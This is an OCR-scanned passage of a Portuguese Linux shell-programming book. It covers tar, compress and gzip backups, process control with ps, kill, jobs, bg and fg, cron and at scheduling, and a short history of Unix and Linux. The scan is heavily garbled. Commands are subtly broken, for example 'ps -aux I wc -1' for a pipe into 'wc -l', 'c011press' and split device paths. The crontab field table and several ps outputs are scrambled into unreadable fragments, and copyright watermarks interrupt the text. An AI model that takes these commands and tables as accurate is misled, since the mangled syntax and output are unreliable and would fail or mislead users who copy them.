2 14 15 1 6 
17 18 19 20 21 22 23 
24 25 26 27 28 29 30 
O que vimos nesse último exemplo não foi um erro, e foi citado como 
uma simples curiosidade. Assume-se que a Reforma Gregoriana ocorreu 
em 3 de Setembro de 1752. Nesta época, a maioria dos países reconheceu 
a reforma (apesar de alguns poucos só a reconhecerem no século XX). 
Essa data e os dez dias que a seguiram foram eliminados, por isso o forma-
to do calendário para esse mês é um tanto inusitado (será que o software 
proprietário teria essa precisão? Duvido ... ). 
Material com direitos autorais 
jCapítulo 7 
: Becapeando 
. 
. 
• • . 
. . . . 
~As cópias de segurança (backup) são fundamentais em 
qualquer sistema. No caso de uma pane mais séria no 
sistema, somente as cópias de segurança podem trazer 
os arquivos dos usuários de volta. 
Neste capítulo veremos, além das instruções de backup, 
os principais comandos de compressão, já que é comum, 
por ser uma boa prática, compactarmos os arquivos antes 
de salvá-los em uma cópia. 
ti 
Comandos de Backup e Compressão 
ta r 
Para agrupar vários arquivos em somente um 
c011press 
É o utilitário de compressão de arquivos padrão do Unix 
uncompress 
Descomprime arquivos compactados pelo compress 
zcat 
Permite visualizar o conteúdo de arquivos compactados 
com compress 
gzip 
É o utilitário de compressão de arquivos padrão do Linux 
gunzip 
Descomprime arquivos compactados pelo gzi p 
I 
tar- Agrupa arquivos 
Sintaxe: 
tar ( - cfprtuvx] [arquivo_ t ar] (arqui vo . . . ] 
59 
Matcnal com direitos al•tora1s 
60 
Programação Shell Linux 
Para não ter de fazer cópias de inúmeros arquivos ou para transferi-los 
para outro computador via ftp, é comum primeiramente agrupá-los em um 
único arquivo para depois procedermos à sua cópia ou transferência. 
No Unix/Linux podemos agrupar vários arquivos em um arquivo simples 
ou mesmo em vários outros meios magnéticos com o comando ta r . 
Parâmetros: 
arquivo 
a r quivo_tar 
_j 
-c 
-f 
-p 
-r 
-t 
·U 
·V 
·X 
um ou mais arquivos a agrupar. Quando tar estiver sen-
do utilizado para desagrupar arquivos, este parâmetro é 
opcional; 
especifica onde será armazenado o conjunto de arquivos 
agrupados. Em geral, arquivo_tar é um dispositivo de 
fita magnética, mas pode-se agrupar os arquivos em um 
único arquivo especificando-o em arquivo_tar, e utili-
zando a opção -f; 
cria um novo arquivo . ta r e adiciona a ele os arquivos 
especificados; 
indica que o destino é um arquivo em disco, e não uma 
unidade de fita magnética; 
preserva permissões originais dos arquivos durante de-
sagrupamento; 
adiciona os arquivos especificados no final do arqu 
. ta r, sem cnar um novo; 
lista o conteúdo do arquivo . ta r; 
adiciona os arquivos especificados ao arquivo . ta r, 
mente se eles ainda não existirem no arquivo .tar, ou 
tiverem sido modificados desde quando foram ag up:aac>s 
por um comando ta r; 
mostra o nome de cada arquivo processado; 
retira os arquivos agrupados no arquivo . ta r. 
Matenal çorn d1re1tos at,tora1s 
Becapeando 
61 
Exemplos: 
$ tar -tvf /dev /ns t O 
Mostra o conteúdo do arquivo 
$ tar -cf backup.tar /home/d 327760/* 
compress- Para compactar dados 
Sintaxe: 
conq:>ress [ - cvf] [arqui vo .. . ] 
O utilitário de compressão de arquivos padrão do Unix é o compress . 
Este utilitário utiliza o algoritmo de compressão Lempei-Zív, que é um mé-
todo razoavelmente rápido e eficiente. O compress gera um arquivo com o 
mesmo nome, porém com a extensão . z compactado. 
Parâmetros: 
arqu~vo : 
- c : 
- f : 
-v: 
Exemplos: 
arquivo a comprimir. Se não for especificado, compress lê a 
partir da entrada padrão; 
escreve na saída padrão, sem modificar o arquivo especifi-
cado; 
força a compactação. Não compacta se o arquivo especifi-
cado não puder ser compactado ou se um arquivo compac-
tado correspondente (extensão .Z) existir; 
mostra informações sobre a porcentagem de compactação 
de cada arquivo. 
$ compress tel efones 
$ ls -1 tel ef* 
- r w- r --r--
1 jtJl io 
di pao 
179 Dec 
7 
1 999 t.elefones . Z 
Material com direitos autorais 
62 Programação Shell Linux 
Repare pelo exemplo anterior que foi gerado um arquivo com a extensão 
. z (Z maiúsculo) e a sua data de criação não se alterou. 
uncompress- Descompactando arquivos 
Sintaxe: 
uncompress (-cv) [ar<ruivo .. . ) 
Para descompactar arquivos compactados com o compress (extensão 
.Z), utiliza-se o uncompress . 
Parâmetros: 
arquivo 
arquivos a descompactar. Se não for especificado, 
uncompress lê a partir da entrada padrão; 
-c 
-v 
escreve descompactado na saída padrão, sem gerar 
arquivo; 
mostra informações sobre a porcentagem de compac-
tação de cada arquivo. 
Exemplos: 
$ uncompress telefones 
$ ls -1 telef• 
-rw-r--r--
1 julio 
dipao 
218 Oec 
7 
1999 tel efones 
No exemplo, você pode notar que: 
No uncompress não há necessidade de usar a extensão . z, 
se eu tivesse feito: 
$ uncompress telefones.Z 
. 
porem 
Não teria havido problema, o uncompress aceita as duas formas; 
Pelo comando ls após a execução do uncompress, você pode notar 
que a extensão . z foi pro brejo. 
1\latcna com d r bS utor <t 
Becapeando 
63 
zcat- Visualizando dados compactados 
Sintaxe: 
Existe ainda um utilitário especial, o zc at, que permite visualizar o con-
teúdo de arquivos comprimidos com c omp ress , sem que seja necessário 
descompactá-los previamente. 
Parâmetros: 
a rquivo 
arquivo a ser exibido descompactado na saída padrão. 
Exemplos: 
$ zcat tele fones 
Ciro Gri ppi 
Cl audi a Marci a 
E.nio Cardo s o 
Juli ana Duart e 
Luiz Carlos 
Ney Garrafas 
Ney Gerhar dt 
!?aul a Duart e 
{02 1 ) 5 5 5-12 34 
{02 1) 555-2ll2 
{023) 232-3423 
{024 ) 622-2 8 7 6 
(02 1) 767- 2124 
{02 1 )988-3398 
{02 4) 5 43- 4321 
{011 ) 4 49- 0219 
Vimos neste caso que também não é necessário que se especifique a 
extensão . z. 
gzip - Compactador livre 
Sintaxe: 
g z i p 
[ -cv fJ:d] [ar qui v o ... ] 
Material com direitos autorais 
64 
Programação Shell Linux 
O utilitário de compressão mais usado no Linux é o gzip . Utilizando uma 
versão mais moderna do algoritmo de compressão Lempei-Zív, o gzip, por 
' 
sua vez, gera um arquivo com extensão . gz , compactado. E uma ferra-
menta GNU. 
Parâmetros: 
arqu1. v o : 
_j Opções 
-c 
-f 
-v 
-r 
Exemplos: 
arquivo a comprimir. Se não for especificado, lê a par-
tir da entrada padrão; 
Significados 
Escreve na saída padrão, sem modificar o arquivo espe-
cificado. 
Força a compactação. Não compacta se o arquivo espe-
cificado não puder ser compactado ou se um arquivo 
compactado correspondente (extensão .gz) existir. 
Mostra informações sobre a porcentagem de compacta-
ção de cada arquivo. 
Comprime também o conteúdo dos subdiretórios (recur-
sivo). 
$ 1s - 1 pacote.tar 
-rw-r-- r - -
1 j ul io d i pao 
245760 Oct 15 12 : 24 pacot e.tar 
$ gzip pacote.tar 
$ l s - 1 pacote.tar.gz 
- n ;- r --r--
1 j ulio dipao 
33640 Oc t 15 12 : 24 pacot e . t ar.gz 
$ gzi p - d pacote.tar.gz 
$ compress pacote . tar 
$ ls - 1 pacote .tar* 
Descompactando com o próprio gzip 
- n ;- r --r --
1 j ulio d i pao 
64 587 Oct 15 12 : 24 pacot e . t a r . Z 
Para arquivos maiores, como vimos neste exemplo, o gzip normalmen-
te supera o compr ess em capacidade de compactação. Neste caso, a razão 
Matenal çorn d1re1tos at,tora1s 
Becapeando 
65 
foi de 33.640 bytes para 64.587 bytes, ou seja, o compress obteve somente 
52,08% da eficiência do gzip . 
gunzip- Descompactador livre 
Sintaxe: 
gunzip [ - cv] [arqui vo ... ] 
Embora exista o parâmetro - d , para descompactar arquivos compacta-
dos com o gzi p, também podemos valer-nos do g unzip . O gunzip tam-
bém é uma ferramenta livre do GNU. 
Parâmetros: 
arqu 1.vo 
- c 
-v 
arquivos a descompactar. Se não for especificado, lê a 
partir da entrada padrão; 
escreve na saída padrão, sem gerar arquivo descom-
pactado; 
mostra informações sobre a porcentagem de compac-
tação de cada arquivo. 
O zcat também permite a visualização do conteúdo dos ar-
quivos compactados com gzip. 
Material com direitos autorais 
1 ·f ·~~ l Capítulo 8 
11' \ 
i Controle de Execucão 
: 
. 
. 
. . 
~ Calma pessoal, nenhum de nós é o carrasco que fica na 
antessala da câmara de gás controlando a execução dos 
condenados! Vamos falar no controle de execução de pro-
cessos, que é outro recurso poderoso do nosso sistema 
operacional. Esse recurso permite colocar um número 
praticamente ilimitado de programas em execução a partir 
de um único Shefl. Além disso, processos demorados po-
dem ser colocados em background (segundo plano), per-
mitindo ao usuário executar outras tarefas em foreground 
(plano principal). 
Um processo é um programa em execução e que não foi 
terminado. Ao contrário de sistemas operacionais como o 
DOS, o Unix/Linux são sistemas multiusuário/multitarefa. Em 
máquinas com um único processador, estes processos são 
executados concorrentemente, compartilhando o processa-
dor (time sharing). Em máquinas com vários processadores, 
esses processos podem ser executados paralelamente. 
Assim, quando mais de um usuário está executando um 
determinado programa, existe um processo sendo exe-
cutado para cada usuário que chamou aquele programa. 
O She/1 é um exemplo de programa que constantemente 
está sendo executado por mais de um usuário, e frequen-
temente é executado mais de uma vez simultaneamente 
por um mesmo usuário. 
66 
Material com direitos autorais 
Controle de Execução 
67 
Quando um programa é executado em ambiente Unix/Linux, um pro-
cesso é criado para executá-lo e recursos como memória e arquivos 
são alocados. Quando um processo termina a execução do programa, o 
sistema destrói o processo e os recursos alocados são devolvidos para 
que sejam aproveitados por um outro processo. Cada processo criado 
possui um número associado a ele chamado de process id (pid). Este 
número distingue o processo de todos os outros processos criados e 
que ainda não terminaram sua execução. Portanto, cada processo pos-
sui um pid único. 
Chamaremos o processo que cria outro de processo pai e o criado de 
processo filho. Um processo pai pode ter vários processos filhos, mas um 
processo filho tem um único processo pai. 
Um processo pai pode suspender sua própria execução até que um ou 
mais de seus filhos termine sua execução. Por exemplo, o She/1 normal-
mente executa um programa criando um processo filho e espera até que o 
processo filho termine sua execução para devolver o prompt. 
Cada processo fica associado ao usuário e ao grupo do usuário. Além 
disso, cada processo também pertence a um grupo de processos. Exis-
te somente um grupo de processos relacionado ao terminal utilizado pelo 
usuário, chamado de foreground. Se um processo do usuário não está no 
grupo de processos do terminal, então este processo pertence ao grupo de 
processos background. 
Os principais comandos para controle de processo são: 
Comandos de controle de execução 
ps 
Mostra o status dos processos em execução 
===== 
kill 
Envia sinal a processo 
jobs== Lista processos em background e suspensos 
bg 
Passa processo para background 
fg 
Traz processo para foreground 
'""' Nohup 
Executa processo independente de terminal 
Matenal çorn d1re1tos at,tora1s 
68 Programação Shell Linux 
ps - Lista de processos 
Sintaxe: 
ps [ -aelux] 
O comando ps mostra o status dos processos em execução no siste-
ma. Sem argumentos, o comando ps exibe informações somente dos pro-
cessos associados ao terminal corrente. A saída do comando consiste de: 
process-id (pid), identificador do terminal, tempo de execução (acumulativo) 
e o nome do comando. 
_j 
-e 
·I 
-a 
Significados 
Apresenta a linha de comando completa. 
Gera a saída em formato 1nncm 
Inclui informações sobre processos pertencentes a 
todos os usuários. 
===-u=== Produz saída orientada a usuário. 
Exemplos: 
$ ps 
PI D TTY 
15473 pts/0 
17280 pts/0 
$ ps - a 
PID TTY 
15473 pts/0 
17281 pts/0 
$ ps - u 
USER 
PID 
jneves 15473 
jneves 172 82 
$ ps - x 
PIO TTY 
15473 pts/0 
17283 pts/0 
$ ps - aux 
USER 
PIO 
root 
1 
·X 
Inclui processos não associados a terminais. 
TIME Ci'ID 
00 : 00 : 00 bash 
00 : 00 : 00 ps 
STAT 
TIME COHNAND 
S 
0 : 00 - bash 
R 
0 : 00 ps a 
%CPU 
0 . 0 
0 . 0 
%MEM 
1 . 2 
1.0 
VSZ 
4516 
2520 
RSS 
752 
64 4 
TTY 
pts/0 
pts/0 
STAT 
TIME COMNANO 
s 
0 : 00 -bash 
R 
0 : 00 ps x 
%CPU %MEM vsz RSS TTY 
0 . 0 
0 . 1 1304 100 ., 
STAT 
s 
R 
START TIME COMI'!ANO 
Jan05 0 : 00 - bash 
16: 56 0 : 00 ps u 
STAT START TIME COMI'!ANO 
S 
2003 0 : 04 i nit [ 3] 
Matenal çorn d1re1tos at,tora1s 
Controle de Execução 
69 
I:OOt 
2 
0 . 0 
0 . 0 
o 
o ? 
sw 
2003 0 : 00 [keventd] 
r oot 
3 
0 . 0 
0 . 0 
o 
o ? 
SWN 
2003 0 : 00 [ ks_ CPlJO] 
ro ot 
4 
0 . 0 
0 . 0 
o 
o ., 
sv1 
2003 0 : 09 [ksõ<apd] 
.t:oot 
5 
0. 0 
0 . 0 
o 
o ? 
SW 
2003 0 : 00 [bdflush) 
As reticências ao final do último exemplo foram colocadas para mostrar 
que a listagem de processos continuava. Vamos ver a quantidade de pro-
cessos em execução: 
$ ps -aux I wc -1 
43 
Nesse último exemplo eu mandei a saída do ps para o contador de linha 
(wc - 1 , lembra-se?). Se do resultado subtrairmos 1 referente à linha doca-
beçalho, teremos 42, que significa a quantidade de processos que estavam 
em execução naquele momento. 
kill - Enviando sinal a processos 
Sintaxe: 
kill [ - sin a l ) pi d ... 
kill - 1 
Se, por algum motivo, um usuário quiser cancelar um processo que lhe 
pertença, o comando kill fará o trabalho. Em geral, utiliza-se o comando 
kill para cancelar processos que aparentemente "travaram" e não conse-
guem terminar sua execução normalmente, ou ainda, para processos que 
não respondem ao CTRL +C para cancelamento de execução. 
Somente o superusuário pode "matar" processos de outros usuários. 
Parâmetros: 
s inal 
se este parâmetro não for especificado, k i ll envia o sinal15 
(termínate) para os processos especificados pelo parâmetro 
pict. Se um nome de sinal ou um número precedido de ·- · 
é dado, este é enviado ao invés do sinal 1'ERN (terminate). 
Quando se deseja cancelar um processo que não responde 
ao kill padrão (sinal 15), utiliza-se o sinal 9 (KILL) . Os 
sinais serão melhor conceituados mais à frente. 
Material com direitos autorais 
70 
Programação Shell Linux 
pict 
o parâmetro pid especifica o process-id correspondente 
ao processo que se deseja enviar um sinal. Para desco-
brir o pid de um processo, basta utilizar o comando ps e 
olhar na coluna pie! o número correspondente ao proces-
so desejado. 
- 1 
invocando kill com a opção -1 , é apresentada a lista dos 
nomes de sinais aceitos pelo comando. 
Exemplos: 
$ ps 
PID TTY STAT THIE CO~!M.AND 
148 ppO 
241 ppO 
242 ppO 
S 0 : 00 -bash 
T O: 00 tel net 
R 0 : 00 ps 
$ kill - 9 241 
$ 
(1) + Ki lled tel net 
Para dar uma parada em um processo use: 
kill - STOP p id 
ou 
kill - 19 p i d 
Logo após, para continuar sua execução, use: 
kill - CONT p i d 
ou 
kill - 18 p i ei 
Execução em Background 
Uma das habilidades do Unix é a de executar processos em background, 
liberando a linha de comando para o usuário imediatamente. Por exemplo, 
o usuário poderia querer copiar um determinado arquivo para disquete, 
enquanto continua pesquisando seus diretórios por outros arquivos para 
copiar. A maneira mais simples de colocar um processo em background é 
adicionar o operador e-comercial < & l ao final da linha de comando. 
Material com direitos autorais 
Exemplos: 
$ mcopy t este .txt a: & 
$ ls does 
[1] + Done mcopy teste . t x t a: 
Controle de Execução 
71 
mcopy copia arquivo de/para DOS 
} O usuário pode execl!far outros comandos 
Fim do comando em background 
Se você disparar um programa em foreground e notar que sua execução 
está demorando muito, pode suspendê-lo para liberar o terminal, pressio-
nando simultaneamente as teclas <CTRL>+z, como no exemplo abaixo: 
$ mcopy teste . t xt a : 
hz 
[1] + stoppect mcopy t este . t xt a: 
"l é a representação <CTRL>+Z na tela 
jobs - Lista processos suspensos e em background 
Sintaxe: 
j obs 
Para descobrirmos quais os processos que estão sendo executados em 
background ou que estão parados (suspensos), utilizamos o comando jobs. 
Exemplo: 
$ jobs 
(1) + mcopy teste . t xt a : 
[2) - more / e t c/passvid s t opped 
~ _Números dosjobs h 
bg- Manda processos para background 
Sintaxe: 
bg [ %n ] 
Outro método para colocar um processo em background consiste em pri-
meiramente parar a execução deste, através do pressionamento das teclas 
<CTRL>+Z, e em seguida dar o comando bg . 
Material com direitos autorais 
72 
Programação Shell Linux 
Parâmetros: 
n 
refere-se ao número do job desejado. Use o comando 
j obs para descobrir o número de um job. Se este parâ-
metro não for especificado o valor 1 é assumido. 
fg - Trazendo processos para foreground 
Sintaxe: 
fg [ %n ) 
Para colocar um processo novamente em foreground (primeiro plano), 
basta usar o comando f g . 
Parâmetros: 
n 
também refere-se ao número do job desejado. Tal qual 
seu irmão bg, use o comando j obs para descobrir o nú-
mero de um job. Se este parâmetro não for especificado 
o valor 1 é assumido. 
Exemplo: 
$ rocopy teste.txt a : 
Az 
(1) + stopped mcopy t est e .txt a: 
$ jobs 
(1) + moz:e i et c/ passvid s t opped 
[2 ] -
mcopy t este . txt a : stopped 
$ bg %2 
mcopy t este .txt a : & 
$ fg 
more I etc/passv;d 
Inicia mcopy em foreground 
Suspende mcopy 
Processo suspenso 
Processo também suspenso 
Execução do job 2 em background 
Execução do job 2 em foreground 
Já havia um processo suspenso (mor e / etc/passHdJ quando eu suspen-
di o segundo (mcopy t este. t xt a : J . Isso ficou óbvio no comando jobs que 
mostrou esses dois processos suspensos. Em seguida mandei o mcopy para 
execução em background e trouxe o more para execução em foreground. 
Material com direitos autorais 
1 ·f ,~~ l Capítulo 9 
11' \ 
i Executando Tarefas 
!Agendadas 
. . . 
• Aqui veremos como agendar tarefas ou executar jobs, vi-
sando a performance do sistema como um todo e não a 
do aplicativo. 
Podemos agendar uma determinada tarefa para uma 
determinada data e horário (como um reorg de um banco 
para ser feito de madrugada) ou ciclicamente (como fazer 
backup semanal toda 6a feira ou o backup mensal sempre 
que for o último dia do mês). 
Programando tarefas com crontab 
crontab é o programa para instalar, desinstalar ou listar as 
tabelas usadas pelo programa (daemon) c r on para que 
possamos agendar a execução de tarefas administrativas. 
Cada usuário pode ter sua própria tabela de cr ontab 
(normalmente com o nome de / var/spool/cron/ Login_ 
do_ usuári o) ou usar a tabela geral do root (normalmente 
em /etc/crontab). A diferença entre as duas formas é so-
mente quanto às permissões de determinadas instruções 
que são de uso exclusivo do root. 
Chamamos de c ront ab não só a tabela que possui 
o agendamento que é consultado pelo programa (dea-
mon) cron, 
como também o programa que mantém o 
73 
Material com direitos autorais 
74 Programação Shell Linux 
agendamento nessa tabela, já que é ele quem edita a tabela, cria uma nova 
entrada ou remove outra. 
Existem dois arquivos que concedem ou não permissão aos usuários 
parausaro crontab . Elessãoo /e tc /cron .a llo•.-~ e /etc/cron .deny. To-
dos os usuários com login name cadastrado no primeiro estão habilitados 
a usá-lo, e os usuários cujos /ogin names constem do segundo estão proi-
bidos de usá-lo. 
Veja só uma mensagem característica para pessoas não autorizadas a 
usar o cron: 
$ crontab - e 
You (fulano_de_ tal) are no t allmved to use t his p.~;ogram (crontah} 
See crontab(l) for more information 
Para permitir que todos os usuários tenham acesso ao uso 
do crontab, devemos criar um /etc/crontab.deny vazio e 
remover o I etc/ crontab . allow . 
Com o crontab você tem todas as facilidades para agendar as tarefas 
repetitivas (normalmente tarefas do admin) para serem executadas qual-
quer dia, qualquer hora, em um determinado momento ... enfim, ele provê 
todas as facilidades necessárias ao agendamento de execução de progra-
mas (normalmente scripts em She/1) tais como backups, pesquisa e elimi-
nação de links quebrados ... 
As principais opções do comando crontab são as seguintes: 
Função 
-r 
Remove o crontab do usuário 
-1 
Exibe o conteúdo do crontab do usuário 
-e 
Edita o crontab atual do usuário 
Matenal çorn d1re1tos at,tora1s 
Executando Tarefas Agendadas 
75 
Campos da tabela crontab 
Valores 
C1> 
C') 
..--
N 
lO 
N 
C') 
..--
CC> 
Possíveis 
• 
• 
• 
• 
• 
o 
o 
..--
..--
o 
ro c 
ro 
<f) 
E 
•Q) 
Q) 
ro 
:à 
cn 
E 
.B 
o 
ro 
ro 
.... 
::I 
ro 
"' 
<f) 
"' 
O) 
c 
.... 
ro 
•Q) 
ro 
e 
Função 
:à 
o 
·-
~ 
:r: 
o 
o 
a. 
Campo 
1 
2 
3 
4 
s 
6 
1 
As tabelas crontab têm o seguinte "leiaute": 
Como pudemos ver, as tabelas são definidas por seis campos separa-
dos por espaços em branco (ou <TAB> ). Vejamos exemplos de linhas da 
tabela para entender melhor: 
~M 
s 
~i 
e 
#n 
H 
m 
#u 
o 
D 
'" 
a 
#t 
r 
i 
e 
n 
#o 
a 
a 
s 
a 
Programa 
#======================================== 
o 
o 
* 
• 
* 
backup . sh 
30 
2 
* 
* 
o 
bkpsemana . sh 
0 , 30 
* 
* 
* 
* 
verifica . sh 
o 
1 
30 
* 
• 
l impafs . sh 
30 
23 
31 
1 2 
* 
encerraano . s h 
O jogo da velha, tralha ou sei-lá-mais-o-quê ( # l indica ao cron que, 
a partir daquele ponto até a linha seguinte, é tudo comentário. Por isso, é 
comum vermos nos crontab de diversas instalações um "cabeçalho" como 
o que está no exemplo. Linha a linha vamos ver os significados: 
Matenal çorn d1re1tos at,tora1s 
76 Programação Shell Linux 
1
11 Linha-
2" Linha-
3a Linha-
48 Linha -
59 Linha-
O comando at 
Todo dia às 00:00 h execute o programa 
backup. s h ; 
Às 02:30 h de todo Domingo execute o pro-
grama bkpsemana _ s h ; 
Todas as horas exatas e meias horas exe-
cute o programa ver ifica - s h ; 
Todo os dias 30 (de todos os meses) à 
01 :00 h execute o programa lirnpats . s h ; 
No dia 31/12 às 23:30 h execute o progra-
ma encerraano. s h . 
Este comando permite que se programem datas e horas para execução de 
tarefas (normalmente scripts em Shell). 
O comando nos permite fazer especificações de tempo bastante com-
plexas_ Ele aceita horas no formato HH:MM para executar um job. 
Você também pode especificar midnight (meia-noite), noon (meio-
dia) ou teat.ime (hora do chá- 16:00 h) e você também pode colocar um 
sufixo de AH ou PN indicando se o horário estipulado é antes ou após o 
meio-dia_ 
Se o horário estipulado já passou, o job será executado no mesmo horá-
rio, porém no próximo dia que atenda à especificação_ 
Você também pode estipular a data que o job será executado dando 
a data no formato nome-do-mês e dia, com ano opcional, ou no formato 
MMDDAA ou MM/DD/AA ou DD.MM.AA. 
Outra forma de especificação é usando noH + unidades_ de_ tempo, onde 
unidades_de_tempo pode ser: rninutes , hours , days , ou weeks. Para fina-
lizar você ainda pode sufixar um horário com as palavras toda y e tomo r r ow 
para especificar que o horário estipulado é para hoje ou amanhã. 
1\latcna com d r bS utor <t 
Executando Tarefas Agendadas 
77 
Exemplos: 
Para os exemplos a seguir, vejamos primeiramente a hora e a data de 
hoje: 
$ date 
Fri Jan 
6 12 : 27 : 43 BRST 2006 
Para executar job . sh às 16:00h daqui a três dias, faça: 
$ at 4 pm + 3days 
a t> job . s h 
at> <EOT> 
j ob 2 at 2006-01- 09 16 : 00 
Calma, vou explicar! O a t tem o seu próprio prompt e, quando passamos 
o comando, ele manda o seu prompt para que passemos a tarefa que será 
executada. Para terminar a passagem de tarefas, fazemos um <CTRL>+D, 
quando o at nos devolve um <EOT> (End Of Text) para a tela e, na linha 
seguinte, o número do job < j ob 2 l com sua programação de execução. 
Para executar o mesmo job às 1 O:OOh de 5 de abril, faça: 
$ at lOam Apr 5 
at> job . sh 
at> <EOT> 
job 3 ac 2 006-04-05 10 : 00 
E se a execução fosse amanhã neste mesmo horário: 
$ at now + 1 day 
at> j ob.sh 
at> <EOT> 
job 4 at 2006- 0l - 0 7 12 : 27 
Para listar os jobs enfileirados para execução, faça: 
$ at - 1 
2 
2006- 01- 09 16 : 00 a jneves 
3 
2006-04-05 10 : 00 a j neves 
4 
2006- 01- 07 12 : 27 a ) ne ves 
Para descontinuar o job número 2 , tirando-o da fila, faça: 
$ atrm 2 
$ atq 
3 
2006-04-05 10 : 00 a j neves 
4 
2006-01-07 12 : 27 a )neves 
Material com direitos autorais 
78 Programação Shell Linux 
Repare: 
1. O atrm removeu o job número 2 da fila sem a menor cerimônia. Não 
pediu sequer confirmação. 
2. Para listar os jobs em execução, foi usado o a tq, que tem exatamen-
te o mesmo comportamento do at - 1. 
Como vimos no c rontab, o at também possui os arquivos 
/etc/at. allow e /etc/at .deny, que servem para definir os 
usuários que podem enfileirar jobs e obedecem às mesmas 
regras citadas para o I etc/cron . allo'"' e /etc/cron .cle ny. 
O comando batch 
Para quem tem que executar tarefas pesadas como uma classificação de 
um grande arquivo, ou um programa de cálculo de uma grande folha de 
pagamento, e não está afim de "sentar" o servidor, é que existe o comando 
batch. Os jobs que são comandados pelo batch ficam em segundo plano 
(background) esperando o sistema ficar "leve". 
Exemplo: 
$ batch 
at> sort biglile -o bi g!ile . soned 
at> <EOT> 
job 8 at 2006-01-06 15 : 04 
Como você viu pelo prompt, o batch é parte integrante do at e obedece 
às mesmas regras e arquivos de configuração. 
No exemplo citado, o sistema imediatamente tentará iniciar o sort , mas 
só o fará efetivamente quando a carga do sistema estiver abaixo de 0.8. 
Caso o sort esteja em andamento e entre outro processo pesado, nova-
mente ele é suspenso aguardando que a carga total baixe. A citada carga 
está no arquivo /proc/loadavg . 
- ~ -
1\latcna com d r bS utor <t 
Parte 11 
Matenal çorn d1re1tos at,tora1s 
Material com direitos autorais 
~ Leiame.txt 
. 
. . . . 
• Na Era Jurássica da Informática, cada fornecedor de 
equipamento tinha o(s) seu(s) próprio(s) Sistema(s) 
Operacional(is) que eram totalmente diferentes entre si. 
Devido a esta grande heterogeneidade, os profissionais 
de informática eram levados a especializarem-se em um 
único Sistema Operacional, o que restringia sobremaneira 
o seu mercado de trabalho. 
No final da década de 1960, um Engenheiro de Softwa-
re, irritado com esta restrição, perguntou-se: 
Se somos capazes de dirigir qualquer modelo de 
qualquer marca de automóvel, por que temos que 
ficar restritos a somente um Sistema Operacional? 
Pronto! Estava lançada a semente dos Sistemas Aber-
tos que, unida à criação da linguagem C, à mesma época, 
gerou o Sistema Operacional UNIX que, por sua vez, ao 
longo destas últimas décadas, originou diversos outros, 
tais como: AT&T, SCO, SOLARIS (estes três adotam a pa-
dronização SVR4, leia-se System Five Release Four), HP-
UX, AIX e muitos mais, culminando com o GNU-LINUXZ. 
2. O nome correto é GNU-Linux (todo software desenvolvido pela comunida-
de sob a licença GPL leva o prefixo GNU), mas para simplificar vou chamâ-lo 
de Linux ao longo deste livro. 
81 
Material com direitos autorais 
82 Programação Shell Linux 
Os americanos, com sua mania de abreviar, chamam-nos genericamente 
de X Systems (Sistemas X) ou UNIX flavor (Sabor UNIX) ou ainda UNIX-
LIKE (COMO O UNIX). 
Muito se fala atualmente no Sistema Operacional LINUX. O que talvez 
muitos não saibam é que Linus Torvalds3 , ao desenvolvê-lo, baseou-se fir-
memente no UNIX, fazendo ligeiras adaptações para atender ao hardware 
e às mídias atuais. 
O Linux é um sistema operacional que segue o mesmo padrão dos siste-
mas Unix desenvolvido sob a licença GPL (sendo portanto livre). Na verdade, 
Linux é apenas o kemel (núcleo) do sistema. Mas por questões de comodidade 
chama-se de Linux toda a gama de aplicações e utilitários complementares. 
Aliado a isso, devemos levar em consideração que uma parte muito 
grande do software dos equipamentos que fazem a Internet funcionar (pro-
vedores, roteadores, servidores, gateways ... ) foram escritos para ambiente 
LINUX, e por ser a Grande Rede um espelho que serve como padrão para 
o mundo, também concorre para a divulgação maciça destes Sistemas 
Operacionais. Atualmente, o Linux conta com milhões de usuários espa-
lhados pelo mundo. Há pouco tempo, os fãs desse Sistema Operacional 
encontravam-se principalmente no meio acadêmico e entre usuários da 
Internet, hoje as grandes corporações já o adotaram, e o governo brasileiro 
vem dando passos largos na sua massificação. 
As características dos dois Sistemas Operacionais (UNIX e LINUX) são 
exatamente as mesmas, e também a administração das instalações que 
os utilizam. Os aplicativos que rodam no primeiro, na imensa maioria dos 
casos, rodam também no segundo, sem fazer quaisquer alterações, bas-
tando, se for o caso, recompilá-los e, se porventura algo tenha que ser al-
terado, a mudança a ser feita normalmente será mínima. Os ambientes de 
execução dos programas também são extremamente semelhantes. 
Para complementar, existem inúmeras corporações que estão migrando 
de UNIX para LINUX sem um grande esforço adicional em programação. Se 
ambos são substancialmente idênticos, então onde está a diferença entre os 
dois? Por que migrar para o LINUX? Além das sofisticadas interfaces grá-
ficas, o grande diferencial é o custo! Quase todas as grandes ferramentas 
3. Seu nome completo e correto é Linus Benedict Torvalds. 
Material com direitos autorais 
Leia me. txt 
83 
de mercado (os Best-Se//ers) foram portados para o Sistema Operacional 
LINUX e podem ser capturados pela Internet graciosamente. Existem muitos 
casos em que softwares caríssimos foram primeiro disponibilizados gratuita-
mente pela Internet para o ambiente LINUX e só após algum tempo começa-
ram a ser vendidos para usuários de outras plataformas. Existe atualmente 
uma consciência geral de que a empresa desenvolvedora que não se aliar à 
filosofia LINUX paulatinamente será alijada do mercado de informática. 
Bem, tudo o que foi até aqui escrito não é somente o comercial do meu 
Sistema Operacional predileto, serve também para demonstrar a compa-
tibilidade entre os programas UNIX-LIKE e é baseado nesta similarida-
de que ao longo desta publicação não farei distinção entre UNIX (Sabor 
SVR4) e LINUX, nem tampouco entre Boume She/1, Kom She/1 e Boume-
Again She/1. Dessa forma, sempre que for citado UNIX, leia-se UNIX-LIKE e 
também no lugar de She/1 deve ser lido Boume She/1, Kom She/1 e Boume-
Again She/1. Quando houver alguma particularidade, ela será citada. 
A seguir uma tabela com alguns Sistemas Operacionais UNIX-LIKE e 
seus desenvolvedores. 
/ 
Desenvolvido Por 
Nome Comercial 
UNIX System Laboratories (Um cisma 
The Single UNIX 
da A T& T) 
Specification 
University of Califomia at Berkeley (UCB) ...2:!~~Y...!:!_
U0!_
N~
IX~
o~
"' ~
J t.__~ 
Cobra Computador;;,:
es== 
SOX 
IBM 
AIX 
Hewlett-Packard 
HP-UX 
SunOS (um pouco antigo) 
Solaris 
· recente) 
Sun Microsystems 
Microsoft 
XENIX 
Ultrix (Antigo) 
UNIX " "''" recente) 
Digital Equipment Corporation 
Silicon Graphics Inc. 
IRIX 
Linus Torvalds, University of Helsinki, e 
LINUX 
muitos outros 
Matenal çom d1re1tos at•tora1s 
? :~ ·~~ i Capítulo O 
11' \ 
i o Básico do Básico 
~....,_.. 
. 
. . . 
~ Por que Capítulo O e não Capítulo 1? Quando as coisas 
são básicas mesmo, estão no zero. O um vem depois e 
